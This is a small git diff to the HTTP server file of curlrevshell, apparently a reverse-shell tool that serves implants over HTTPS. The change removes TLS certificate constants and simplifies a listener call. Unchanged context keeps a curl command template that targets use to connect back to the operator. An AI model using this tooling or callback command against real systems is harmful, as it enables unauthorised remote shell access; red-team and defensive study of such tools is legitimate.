@@ -6,7 +6,7 @@ package hsrv
  * HTTP server
  * By J. Stuart McMurray
  * Created 20240324
- * Last Modified 20240406
+ * Last Modified 20240408
  */
 
 import (
@@ -23,17 +23,12 @@ import (
 	"strings"
 	"sync"
 	"text/template"
-	"time"
 
 	"github.com/magisterquis/curlrevshell/lib/opshell"
 	"github.com/magisterquis/curlrevshell/lib/sstls"
 )
 
 const (
-	// CertLifespan is how long our self-signed cert lasts.  It's roughly
-	// ten years.
-	CertLifespan = 365 * 24 * time.Hour
-
 	// CurlFormat prints the start of the curl command used to connect
 	// to us.
 	CurlFormat = `curl -sk --pinnedpubkey 'sha256//%s' 'https://%s`
@@ -53,11 +48,6 @@ const (
 
 	LKError      = "error"
 	LKListenAddr = "address"
-)
-
-var (
-	// CertSubject is the subject we use for the generated TLS certificate.
-	CertSubject = "curlrevshell"
 )
 
 // Server serves implants over HTTPS.
@@ -125,13 +115,7 @@ func New(
 	}
 
 	/* Start our listener. */
-	if l, err = sstls.Listen(
-		"tcp",
-		addr,
-		CertSubject,
-		CertLifespan,
-		certFile,
-	); nil != err {
+	if l, err = sstls.Listen("tcp", addr, "", 0, certFile); nil != err {
 		return nil, nil, fmt.Errorf("listening on %s: %w", addr, err)
 	}
 	sl.Info(LMListening, LKListenAddr, l.Addr().String())
